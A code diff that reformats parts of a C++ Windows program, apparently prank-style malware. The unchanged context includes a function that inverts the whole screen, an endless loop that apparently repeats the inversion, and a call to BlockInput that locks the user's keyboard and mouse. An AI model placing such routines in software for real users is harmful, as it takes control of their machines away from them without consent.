@@ -2,7 +2,7 @@
 #include <windows.h>
 #include <stdlib.h>
 #include <time.h>
-#include <Vector.h>
+#include <vector.h>
 #include <cstdio>
 #include <string>
 #include <pthread.h>
@@ -303,9 +303,9 @@ void strReverseW(LPWSTR str) {
 
 void InvertColor() {
 	int cx = GetSystemMetrics(SM_CXFULLSCREEN);
-    int cy = GetSystemMetrics(SM_CYFULLSCREEN);
-    HDC hdc = GetDC(0);
-    BitBlt(hdc, 0, 0, cx, cy, hdc, 0, 0, NOTSRCCOPY);
+	int cy = GetSystemMetrics(SM_CYFULLSCREEN);
+	HDC hdc = GetDC(0);
+	BitBlt(hdc, 0, 0, cx, cy, hdc, 0, 0, NOTSRCCOPY);
 }
 void infInvColor(){
 	for(;;){
@@ -453,9 +453,9 @@ int AllLock(bool lockb=false){
 	HINSTANCE hIn = NULL;
 	hIn = LoadLibrary("user32.dll");
 	if(hIn){
-        BOOL (_stdcall *BlockInput)(BOOL bFlag);
-        BlockInput = (BOOL (_stdcall *)(BOOL bFlag)) GetProcAddress(hIn, "BlockInput");
-        if (BlockInput) return BlockInput(lockb);
-    }
+		BOOL (_stdcall *BlockInput)(BOOL bFlag);
+		BlockInput = (BOOL (_stdcall *)(BOOL bFlag)) GetProcAddress(hIn, "BlockInput");
+		if (BlockInput) return BlockInput(lockb);
+	}
 	return -1;
 }
